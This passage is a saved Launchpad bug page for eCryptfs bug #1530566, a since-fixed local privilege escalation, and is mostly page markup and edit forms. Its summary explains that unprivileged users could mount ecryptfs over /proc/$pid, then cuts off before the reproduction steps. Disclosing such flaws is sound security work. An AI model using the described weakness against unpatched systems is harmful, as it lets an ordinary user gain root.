@@ -1,0 +1,4180 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
+  <head>
+<base href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+index" />
+
+    <meta charset="UTF-8" />
+    <title>Bug #1530566 “privilege escalation by mounting over /proc/$pid” : Bugs : eCryptfs</title>
+    <link rel="shortcut icon" href="/@@/launchpad.png" />
+    <link rel="canonical" href="https://bugs.launchpad.net/bugs/1530566" />
+    
+      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/1530566/bug.atom" title="Bug 1530566 Feed" />
+    
+
+    
+  
+  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />
+
+
+    
+
+    
+      <meta name="description" content="An unprivileged user can mount an ecryptfs over /proc/$pid because according to stat(), it is a normal directory and owned by the user. However, the user is not actually permitted to create arbitrary directory entries in /proc/$pid, and ecryptfs' behavior might be enabling privilege escalation attacks with the help of other programs that use procfs.
+
+Repro:
+
+On Ubuntu 15.10 Desktop, as root, install ecryptfs-utils and uidmap. Then, as user, do this:
+
+==========================================..." />
+      <meta property="og:description" content="An unprivileged user can mount an ecryptfs over /proc/$pid because according to stat(), it is a normal directory and owned by the user. However, the user is not actually permitted to create arbitrary directory entries in /proc/$pid, and ecryptfs' behavior might be enabling privilege escalation attacks with the help of other programs that use procfs.
+
+Repro:
+
+On Ubuntu 15.10 Desktop, as root, install ecryptfs-utils and uidmap. Then, as user, do this:
+
+==========================================..." />
+    
+
+    
+    
+      <meta property="og:title" content="Bug #1530566 “privilege escalation by mounting over /proc/$pid” : Bugs : eCryptfs" />
+      <meta property="og:type" content="website" />
+      <meta property="og:image" content="/@@/launchpad.png" />
+      <meta property="og:url" content="https://bugs.launchpad.net/bugs/1530566" />
+      <meta property="og:site_name" content="Launchpad" />
+    
+
+    
+
+    
+  
+
+  
+  
+  <script type="text/javascript">
+    var LP = {
+        cache: {},
+        links: {}
+    };
+  </script>
+
+  
+
+  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>
+
+   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
+   <script type="text/javascript">
+        var raw = null;
+        if (LP.devmode) {
+           raw = 'raw';
+        }
+        YUI.GlobalConfig = {
+            combine: true,
+            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
+            root: 'yui/',
+            filter: raw,
+            debug: false,
+            fetchCSS: false,
+            maxURLLength: 2000,
+            groups: {
+                lp: {
+                    combine: true,
+                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
+                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
+                    root: 'lp/',
+                    // comes from including lp/meta.js
+                    modules: LP_MODULES,
+                    fetchCSS: false
+                }
+            }
+        }</script>
+
+  <script type="text/javascript">
+      // we need this to create a single YUI instance all events and code
+      // talks across. All instances of YUI().use should be based off of
+      // LPJS instead.
+      var LPJS = new YUI();
+  </script>
+
+
+
+    <script id="base-layout-load-scripts" type="text/javascript">
+        //<![CDATA[
+        LPJS.use('base', 'node', 'console', 'event',
+            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
+            'lp.app.inlinehelp', 'lp.app.links',
+            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
+            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
+            'lp.views.global',
+             function(Y) {
+
+            Y.on("domready", function () {
+                var global_view = new Y.lp.views.Global();
+                global_view.render();
+
+                Y.lp.app.sorttable.SortTable.init();
+                Y.lp.app.inlinehelp.init_help();
+                Y.lp.activate_collapsibles();
+                Y.lp.app.foldables.activate();
+                Y.lp.app.links.check_valid_lp_links();
+            });
+
+            Y.on('lp:context:web_link:changed', function(e) {
+                  window.location = e.new_value;
+            });
+        });
+        //]]>
+    </script>
+    <script id="base-helper-functions" type="text/javascript">
+         //<![CDATA[
+        // This code is pulled from lp.js that needs to be available on every
+        // request. Pulling here to get it outside the scope of the YUI block.
+        function setFocusByName(name) {
+            // Focus the first element matching the given name which can be focused.
+            var nodes = document.getElementsByName(name);
+            var i, node;
+            for (i = 0; i < nodes.length; i++) {
+                node = nodes[i];
+                if (node.focus) {
+                    try {
+                        // Trying to focus a hidden element throws an error in IE8.
+                        if (node.offsetHeight !== 0) {
+                            node.focus();
+                        }
+                    } catch (e) {
+                        LPJS.use('console', function(Y) {
+                            Y.log('In setFocusByName(<' +
+                                node.tagName + ' type=' + node.type + '>): ' + e);
+                        });
+                    }
+                    break;
+                }
+            }
+        }
+
+        function selectWidget(widget_name, event) {
+          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
+              // Avoid firing if user is tabbing through or simply pressing
+              // enter to submit the form.
+              return;
+          }
+          document.getElementById(widget_name).checked = true;
+        }
+        //]]>
+    </script>
+
+    
+      
+      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["a11y", "appstream", "bionic", "bisect-done", "bitesize", "cherry-pick", "community-security", "desktop-file", "disco", "dist-upgrade", "focal", "ftbfs", "groovy", "hirsute", "hw-specific", "impish", "jammy", "kernel", "kernel-bug", "manpage", "metabug", "multiarch", "needs-bisect", "needs-design", "needs-packaging", "needs-reassignment", "package-conflict", "packaging", "patch", "patch-accepted-debian", "patch-accepted-upstream", "patch-forwarded-debian", "patch-forwarded-upstream", "patch-needswork", "patch-rejected", "patch-rejected-debian", "patch-rejected-upstream", "performing-bisect", "py2-removal", "qt4-removal", "regression-proposed", "regression-release", "regression-update", "string-fix", "suspend-resume", "systemd-boot", "testcase", "touch", "unmetdeps", "upgrade-software-version", "verification-done-bionic", "verification-done-focal", "verification-done-groovy", "verification-done-hirsute", "verification-done-impish", "verification-done-xenial", "verification-failed-bionic", "verification-failed-groovy", "verification-failed-impish", "verification-failed-xenial", "verification-needed-bionic", "verification-needed-focal", "verification-needed-groovy", "verification-needed-hirsute", "verification-needed-impish", "verification-needed-trusty", "verification-needed-xenial", "wayland", "xenial"];</script>
+      <script type="text/javascript">
+        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
+                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
+                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
+            Y.on('domready', function() {
+                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
+                Y.lp.bugs.bugtask_index.setup_bugtask_index();
+                Y.lp.bugs.bugtask_index.setup_bugtask_table();
+                LP.cache.comment_context = LP.cache.bug;
+                var cl = new Y.lp.app.comment.CommentList();
+                cl.render();
+                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
+                    container_box: '#other-bug-subscribers',
+                    subscribers_details_view:
+                        '/+bug-portlet-subscribers-details',
+                    subscribe_someone_else_link: '.menu-link-addsubscriber'
+                }, window);
+
+                Y.lp.services.messages.edit.setup();
+            });
+         });
+      </script>
+      <style type="text/css">
+        /* Align the 'add comment' link to the right of the comment box. */
+        #add-comment-form textarea { width: 100%; }
+        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
+        #add-comment-form .actions {float: right;}
+        .buglink-summary dd { font-size: 10px; }
+        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
+      </style>
+      <style type="text/css">
+        .yui3-overlay .value label  {
+          /* It normally makes sense for form labels to be bold, but since
+          this form consists only of radio buttons, there's nothing but labels
+          so we just get wall-to-wall bold. */
+          font-weight: normal !important;
+        }
+      </style>
+    
+    
+  </head>
+
+  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
+      main_side
+      public
+      yui3-skin-sam">
+          
+          
+    <div class="yui-d0">
+      <div id="locationbar" class="login-logout">
+        
+
+<div id="logincontrol"><a href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+login">Log in / Register</a></div>
+
+
+
+      </div><!--id="locationbar"-->
+
+      <div id="watermark" class="watermark-apps-portlet">
+        <div>
+          <a href="https://launchpad.net/ecryptfs"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/88108375/ecryptfs_64b.png" /></a>
+        </div>
+        <div class="wide">
+          <h2 id="watermark-heading"><a href="https://launchpad.net/ecryptfs">eCryptfs</a></h2>
+        </div>
+        
+  <!-- Application Menu -->
+  <ul class="facetmenu">
+    
+      
+      <li class="overview"><a href="https://launchpad.net/ecryptfs">Overview</a></li>
+      
+    
+    
+      
+      <li class="branches"><a href="https://code.launchpad.net/ecryptfs">Code</a></li>
+      
+    
+    
+      <li class="bugs active"><a href="https://bugs.launchpad.net/ecryptfs">Bugs</a></li>
+      
+      
+    
+    
+      
+      <li class="specifications"><a href="https://blueprints.launchpad.net/ecryptfs">Blueprints</a></li>
+      
+    
+    
+      
+      <li class="translations"><a href="https://translations.launchpad.net/ecryptfs">Translations</a></li>
+      
+    
+    
+      
+      <li class="answers"><a href="https://answers.launchpad.net/ecryptfs">Answers</a></li>
+      
+    
+  </ul>
+
+      </div>
+
+      <div class="yui-t4">
+        <div id="maincontent" class="yui-main">
+          <div class="yui-b" dir="ltr">
+            <div class="context-publication">
+              
+      <h1 id="edit-title">
+<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
+    privilege escalation by mounting over /proc/$pid
+</span>
+  
+</h1>
+
+
+
+    
+              
+
+              <div id="registration" class="registering">
+                
+      Bug #1530566 reported by
+      <a href="https://launchpad.net/~jann-e" class="sprite person">Jann Horn</a>
+      <time title="2016-01-02 19:17:08 UTC" datetime="2016-01-02T19:17:08.503040+00:00">on 2016-01-02</time>
+    
+              </div>
+            </div>
+
+            
+            <div id="request-notifications">
+              
+            </div>
+
+            
+              <div>
+
+      
+
+      <div id="bug-is-duplicate">
+          
+      </div>
+      
+
+      <div style="float: right;">
+        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">260</a></span>
+      </div>
+
+      
+
+
+  
+  
+    <div class="actions">
+      <span id="affectsmetoo" style="display: inline">This bug affects 1 person</span>
+    </div>
+  
+
+
+
+    <table id="affected-software" class="listing">
+      <thead>
+        <tr>
+          <th colspan="2">Affects</th>
+          <th>Status</th>
+          <th>Importance</th>
+          <th>Assigned to</th>
+          <th>Milestone</th>
+        </tr>
+      </thead>
+
+      <tbody>
+        
+          
+  <tr class="highlight" id="tasksummary1971776">
+    <td>
+      <a class="bugtask-expander" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+editstatus">
+        &#8203;
+      </a>
+    </td>
+    
+    <td>
+      <span id="bugtarget-picker-tasksummary1971776">
+        <span class="yui3-activator-data-box">
+            <a class="sprite product" href="https://bugs.launchpad.net/ecryptfs">eCryptfs</a>
+        </span>
+        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+          Edit
+        </button>
+        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        
+      </span>
+    </td>
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+editstatus" style="float: left" class="value statusFIXCOMMITTED">Fix Committed</a>
+          <a href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceHIGH">High</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary1971776">
+          <span class="yui3-activator-data-box">
+            <a class="sprite person" href="https://launchpad.net/~tyhicks">Tyler Hicks</a>
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    <tr class="bugtask-collapsible-content hidden" id="task1971776">
+     <td colspan="7"><form action="/ecryptfs/+bug/1530566/+editstatus" method="post" enctype="multipart/form-data">
+  
+
+  <p class="error message">
+    You need to log in to change this bug's status.
+  </p>
+  
+  <table class="summary" style="float: right; margin-left: 1em;">
+    <tr>
+      <th>Affecting:</th>
+      <td><a href="/ecryptfs">eCryptfs</a></td>
+    </tr>
+    <tr>
+      <th>Filed here by:</th>
+      <td><a href="https://launchpad.net/~jann-e" class="sprite person">Jann Horn</a></td>
+    </tr>
+    <tr>
+      <th>When:</th>
+      <td>
+        <time title="2016-01-02 19:17:08 UTC" datetime="2016-01-02T19:17:08.503040+00:00">2016-01-02</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Confirmed:</th>
+      <td>
+        <time title="2016-01-21 01:22:07 UTC" datetime="2016-01-21T01:22:07.562324+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Assigned:</th>
+      <td>
+        <time title="2016-01-21 01:22:01 UTC" datetime="2016-01-21T01:22:01.732243+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Started work:</th>
+      <td>
+        <time title="2016-01-21 01:22:07 UTC" datetime="2016-01-21T01:22:07.562324+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    
+  </table>
+  <div class="field">
+    <table>
+      <tr>
+        <td>
+          <label for="ecryptfs.target">Target</label>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <table>
+  <tr>
+    <td>
+      <label>
+        <input class="radioType" id="ecryptfs.target.option.package" name="ecryptfs.target" type="radio" value="package" />
+        Distribution
+      </label>
+    </td>
+    <td>
+      <select id="ecryptfs.target.distribution" name="ecryptfs.target.distribution" size="1" >
+<option value="baltix">Baltix</option>
+<option value="boss">BOSS</option>
+<option value="charms">Juju Charms Collection</option>
+<option value="elbuntu">Elbuntu</option>
+<option value="guadalinex">Guadalinex</option>
+<option value="guadalinexedu">Guadalinex Edu</option>
+<option value="kiwilinux">Kiwi Linux</option>
+<option value="nubuntu">nUbuntu</option>
+<option value="pld-linux">PLD Linux</option>
+<option value="tilix">Tilix</option>
+<option value="tuxlab">tuXlab</option>
+<option selected="selected" value="ubuntu">Ubuntu</option>
+<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
+<option value="ubuntu-rtm">Ubuntu RTM</option>
+</select>
+<input name="ecryptfs.target.distribution-empty-marker" type="hidden" value="1" />
+    </td>
+  </tr>
+  <tr>
+    <td align="right">
+      <label for="ecryptfs.target.option.package">
+        Package
+      </label>
+    </td>
+    <td>
+      
+
+
+    <input type="text" value="" id="ecryptfs.target.package"
+                         name="ecryptfs.target.package" size="20"
+                         maxlength=""
+                         onKeyPress="selectWidget(&#x27;ecryptfs.target.option.package&#x27;, event)" style=""
+                         class="" />
+
+    
+      
+      <script type="text/javascript">
+          LPJS.use('node', 'lp.app.picker', function(Y) {
+              var text_input = Y.DOM.byId('ecryptfs.target.package');
+              var select_menu = Y.DOM.byId('ecryptfs.target.package-suggestions');
+              Y.lp.app.picker.connect_select_menu(
+                  select_menu, text_input);
+          });</script>
+    
+
+    <span class="hidden">(<a id="show-widget-ecryptfs-target-package" href="#">Find&hellip;</a>)</span>
+    <script>
+    LPJS.use('node', 'lp.app.picker', function(Y) {
+        var config = {"remove_team_text": "Remove team", "header": "Select a package", "show_remove_button": false, "selected_value": null, "step_title": "Search by name", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "DistributionPackage", "input_element": "ecryptfs.target.package", "show_widget_id": "show-widget-ecryptfs-target-package", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
+        var show_widget_id = 'show-widget-ecryptfs-target-package';
+        Y.lp.app.picker.addPicker(config, show_widget_id);
+    });
+    </script>
+  
+
+
+
+    </td>
+  </tr>
+
+  <tr>
+    <td>
+      <label>
+        <input class="radioType" checked="checked" id="ecryptfs.target.option.product" name="ecryptfs.target" type="radio" value="product" />
+       Project
+      </label>
+    </td>
+    <td>
+      
+
+
+    <input type="text" value="ecryptfs" id="ecryptfs.target.product"
+                         name="ecryptfs.target.product" size="20"
+                         maxlength=""
+                         onKeyPress="selectWidget(&#x27;ecryptfs.target.option.product&#x27;, event)" style=""
+                         class="" />
+
+    
+      
+      <script type="text/javascript">
+          LPJS.use('node', 'lp.app.picker', function(Y) {
+              var text_input = Y.DOM.byId('ecryptfs.target.product');
+              var select_menu = Y.DOM.byId('ecryptfs.target.product-suggestions');
+              Y.lp.app.picker.connect_select_menu(
+                  select_menu, text_input);
+          });</script>
+    
+
+    <span class="hidden">(<a id="show-widget-ecryptfs-target-product" href="#">Find&hellip;</a>)</span>
+    <script>
+    LPJS.use('node', 'lp.app.picker', function(Y) {
+        var config = {"remove_team_text": "Remove team", "header": "Select a project", "show_remove_button": false, "selected_value": "ecryptfs", "step_title": "Search", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "Product", "input_element": "ecryptfs.target.product", "show_widget_id": "show-widget-ecryptfs-target-product", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
+        var show_widget_id = 'show-widget-ecryptfs-target-product';
+        Y.lp.app.picker.addPicker(config, show_widget_id);
+    });
+    </script>
+  
+
+
+
+    </td>
+  </tr>
+</table>
+
+          
+        </td>
+      </tr>
+    </table>
+    
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ecryptfs.status">Status</label>
+        </td>
+        <td>
+          <label style="font-weight: bold" for="ecryptfs.importance">Importance</label>
+        </td>
+        
+      </tr>
+      <tr>
+        <td><div>
+<div class="value">
+<select id="ecryptfs.status" name="ecryptfs.status" size="1" >
+<option selected="selected" value="Fix Committed">Fix Committed</option>
+</select>
+</div>
+<input name="ecryptfs.status-empty-marker" type="hidden" value="1" />
+</div></td>
+        <td title="Changeable only by a project maintainer or bug supervisor">
+          <span class="sprite read-only"></span>
+          <span class="importanceHIGH">High</span>
+        </td>
+        
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ecryptfs.assignee">Assigned to</label>
+        </td>
+      </tr>
+      <tr>
+        <td colspan="2" style="white-space: nowrap">
+
+  <table>
+    
+    <tr>
+      <td style="padding: 0 2px 2px 0">
+        <input type="radio" id="ecryptfs.assignee.assign_to_me" name="ecryptfs.assignee.option" value="ecryptfs.assignee.assign_to_me" />
+      </td>
+      <td style="padding: 0">
+        <label style="font-weight: normal" for="ecryptfs.assignee.assign_to_me">
+          Me
+        </label>
+      </td>
+    </tr>
+    
+      
+        <tr>
+          <td style="padding: 0 2px 2px 0">
+              <input type="radio" checked="checked" id="ecryptfs.assignee.assigned_to" name="ecryptfs.assignee.option" value="ecryptfs.assignee.assigned_to" />
+          </td>
+          <td style="padding: 0">
+            <label style="font-weight: normal" for="ecryptfs.assignee.assigned_to">
+              Tyler Hicks (tyhicks)
+            </label>
+          </td>
+        </tr>
+      
+    
+    
+  </table>
+
+
+</td>
+      </tr>
+    </table>
+    
+  </div>
+  <div class="field">
+    <div>
+      <label style="font-weight: bold" for="ecryptfs.comment_on_change">Comment on this change (optional)</label>
+      <textarea cols="62" rows="4" id="ecryptfs.comment_on_change" name="ecryptfs.comment_on_change"></textarea>
+    </div>
+    <div>
+      <label style="font-weight: normal">
+        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
+        Email me about changes to this bug report
+      </label>
+    </div>
+  </div>
+  
+</form>
+</td>
+    </tr>
+  
+
+
+        
+        
+          
+  <tr id="tasksummary1976262">
+    <td>
+      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/+source/ecryptfs-utils/+bug/1530566/+editstatus">
+        &#8203;
+      </a>
+    </td>
+    
+    <td>
+      <span id="bugtarget-picker-tasksummary1976262">
+        <span class="yui3-activator-data-box">
+            <a class="sprite package-source" href="https://bugs.launchpad.net/ubuntu/+source/ecryptfs-utils" title="Latest release: 111-5ubuntu1, uploaded to universe on 2020-11-23 11:11:07.828228+00:00 by Dimitri John Ledkov (xnox), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)">ecryptfs-utils (Ubuntu)</a>
+        </span>
+        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+          Edit
+        </button>
+        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        
+      </span>
+    </td>
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceHIGH">High</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary1976262">
+          <span class="yui3-activator-data-box">
+            <a class="sprite person" href="https://launchpad.net/~kirkland">Dustin Kirkland </a>
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    <tr class="bugtask-collapsible-content hidden" id="task1976262">
+     <td colspan="7"><form action="/ubuntu/+source/ecryptfs-utils/+bug/1530566/+editstatus" method="post" enctype="multipart/form-data">
+  
+
+  <p class="error message">
+    You need to log in to change this bug's status.
+  </p>
+  
+  <table class="summary" style="float: right; margin-left: 1em;">
+    <tr>
+      <th>Affecting:</th>
+      <td><a href="/ubuntu/+source/ecryptfs-utils">ecryptfs-utils (Ubuntu)</a></td>
+    </tr>
+    <tr>
+      <th>Filed here by:</th>
+      <td><a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks</a></td>
+    </tr>
+    <tr>
+      <th>When:</th>
+      <td>
+        <time title="2016-01-11 16:48:37 UTC" datetime="2016-01-11T16:48:37.276794+00:00">2016-01-11</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Confirmed:</th>
+      <td>
+        <time title="2016-01-21 01:21:43 UTC" datetime="2016-01-21T01:21:43.482802+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Assigned:</th>
+      <td>
+        <time title="2016-01-21 01:21:51 UTC" datetime="2016-01-21T01:21:51.875290+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Started work:</th>
+      <td>
+        <time title="2016-01-22 18:30:25 UTC" datetime="2016-01-22T18:30:25.424143+00:00">2016-01-22</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Completed:</th>
+      <td>
+        <time title="2016-01-22 18:30:25 UTC" datetime="2016-01-22T18:30:25.424143+00:00">2016-01-22</time>
+      </td>
+    </tr>
+  </table>
+  <div class="field">
+    <table>
+      <tr>
+        <td>
+          <label for="ubuntu_ecryptfs-utils.target">Target</label>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <table>
+  <tr>
+    <td>
+      <label>
+        <input class="radioType" checked="checked" id="ubuntu_ecryptfs-utils.target.option.package" name="ubuntu_ecryptfs-utils.target" type="radio" value="package" />
+        Distribution
+      </label>
+    </td>
+    <td>
+      <select id="ubuntu_ecryptfs-utils.target.distribution" name="ubuntu_ecryptfs-utils.target.distribution" size="1" >
+<option value="baltix">Baltix</option>
+<option value="boss">BOSS</option>
+<option value="charms">Juju Charms Collection</option>
+<option value="elbuntu">Elbuntu</option>
+<option value="guadalinex">Guadalinex</option>
+<option value="guadalinexedu">Guadalinex Edu</option>
+<option value="kiwilinux">Kiwi Linux</option>
+<option value="nubuntu">nUbuntu</option>
+<option value="pld-linux">PLD Linux</option>
+<option value="tilix">Tilix</option>
+<option value="tuxlab">tuXlab</option>
+<option selected="selected" value="ubuntu">Ubuntu</option>
+<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
+<option value="ubuntu-rtm">Ubuntu RTM</option>
+</select>
+<input name="ubuntu_ecryptfs-utils.target.distribution-empty-marker" type="hidden" value="1" />
+    </td>
+  </tr>
+  <tr>
+    <td align="right">
+      <label for="ubuntu_ecryptfs-utils.target.option.package">
+        Package
+      </label>
+    </td>
+    <td>
+      
+
+
+    <input type="text" value="ecryptfs-utils" id="ubuntu_ecryptfs-utils.target.package"
+                         name="ubuntu_ecryptfs-utils.target.package" size="20"
+                         maxlength=""
+                         onKeyPress="selectWidget(&#x27;ubuntu_ecryptfs-utils.target.option.package&#x27;, event)" style=""
+                         class="" />
+
+    
+      
+      <script type="text/javascript">
+          LPJS.use('node', 'lp.app.picker', function(Y) {
+              var text_input = Y.DOM.byId('ubuntu_ecryptfs-utils.target.package');
+              var select_menu = Y.DOM.byId('ubuntu_ecryptfs-utils.target.package-suggestions');
+              Y.lp.app.picker.connect_select_menu(
+                  select_menu, text_input);
+          });</script>
+    
+
+    <span class="hidden">(<a id="show-widget-ubuntu_ecryptfs-utils-target-package" href="#">Find&hellip;</a>)</span>
+    <script>
+    LPJS.use('node', 'lp.app.picker', function(Y) {
+        var config = {"remove_team_text": "Remove team", "header": "Select a package", "show_remove_button": false, "selected_value": "ecryptfs-utils", "step_title": "Search by name", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "DistributionPackage", "input_element": "ubuntu_ecryptfs-utils.target.package", "show_widget_id": "show-widget-ubuntu_ecryptfs-utils-target-package", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
+        var show_widget_id = 'show-widget-ubuntu_ecryptfs-utils-target-package';
+        Y.lp.app.picker.addPicker(config, show_widget_id);
+    });
+    </script>
+  
+
+
+
+    </td>
+  </tr>
+
+  <tr>
+    <td>
+      <label>
+        <input class="radioType" id="ubuntu_ecryptfs-utils.target.option.product" name="ubuntu_ecryptfs-utils.target" type="radio" value="product" />
+       Project
+      </label>
+    </td>
+    <td>
+      
+
+
+    <input type="text" value="" id="ubuntu_ecryptfs-utils.target.product"
+                         name="ubuntu_ecryptfs-utils.target.product" size="20"
+                         maxlength=""
+                         onKeyPress="selectWidget(&#x27;ubuntu_ecryptfs-utils.target.option.product&#x27;, event)" style=""
+                         class="" />
+
+    
+      
+      <script type="text/javascript">
+          LPJS.use('node', 'lp.app.picker', function(Y) {
+              var text_input = Y.DOM.byId('ubuntu_ecryptfs-utils.target.product');
+              var select_menu = Y.DOM.byId('ubuntu_ecryptfs-utils.target.product-suggestions');
+              Y.lp.app.picker.connect_select_menu(
+                  select_menu, text_input);
+          });</script>
+    
+
+    <span class="hidden">(<a id="show-widget-ubuntu_ecryptfs-utils-target-product" href="#">Find&hellip;</a>)</span>
+    <script>
+    LPJS.use('node', 'lp.app.picker', function(Y) {
+        var config = {"remove_team_text": "Remove team", "header": "Select a project", "show_remove_button": false, "selected_value": null, "step_title": "Search", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "Product", "input_element": "ubuntu_ecryptfs-utils.target.product", "show_widget_id": "show-widget-ubuntu_ecryptfs-utils-target-product", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
+        var show_widget_id = 'show-widget-ubuntu_ecryptfs-utils-target-product';
+        Y.lp.app.picker.addPicker(config, show_widget_id);
+    });
+    </script>
+  
+
+
+
+    </td>
+  </tr>
+</table>
+
+          
+        </td>
+      </tr>
+    </table>
+    
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_ecryptfs-utils.status">Status</label>
+        </td>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_ecryptfs-utils.importance">Importance</label>
+        </td>
+        
+      </tr>
+      <tr>
+        <td><div>
+<div class="value">
+<select id="ubuntu_ecryptfs-utils.status" name="ubuntu_ecryptfs-utils.status" size="1" >
+<option selected="selected" value="Fix Released">Fix Released</option>
+</select>
+</div>
+<input name="ubuntu_ecryptfs-utils.status-empty-marker" type="hidden" value="1" />
+</div></td>
+        <td title="Changeable only by a project maintainer or bug supervisor">
+          <span class="sprite read-only"></span>
+          <span class="importanceHIGH">High</span>
+        </td>
+        
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_ecryptfs-utils.assignee">Assigned to</label>
+        </td>
+      </tr>
+      <tr>
+        <td colspan="2" style="white-space: nowrap">
+
+  <table>
+    
+    <tr>
+      <td style="padding: 0 2px 2px 0">
+        <input type="radio" id="ubuntu_ecryptfs-utils.assignee.assign_to_me" name="ubuntu_ecryptfs-utils.assignee.option" value="ubuntu_ecryptfs-utils.assignee.assign_to_me" />
+      </td>
+      <td style="padding: 0">
+        <label style="font-weight: normal" for="ubuntu_ecryptfs-utils.assignee.assign_to_me">
